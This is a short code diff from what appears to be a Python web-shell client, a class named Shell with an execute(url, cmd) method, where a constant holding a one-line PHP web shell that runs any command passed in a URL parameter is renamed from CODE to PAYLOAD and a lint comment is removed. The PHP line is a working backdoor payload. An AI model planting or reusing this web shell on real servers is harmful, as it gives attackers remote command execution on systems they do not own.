@@ -6,7 +6,7 @@ import os
 
 class Shell:
 
-    CODE = '<?php echo shell_exec($_GET["cmd"]); ?>'
+    PAYLOAD = '<?php echo shell_exec($_GET["cmd"]); ?>'
 
     @staticmethod
     def execute(url, cmd):
@@ -15,7 +15,7 @@ class Shell:
         if len(cmd_stripped) == 0:
             return
 
-        if cmd_stripped == 'cls' or cmd_stripped == 'clear': # pylint: disable=used-before-assignment
+        if cmd_stripped == 'cls' or cmd_stripped == 'clear':
             if os.name == 'nt':
                 subprocess.call('cls', shell=True)
             else:
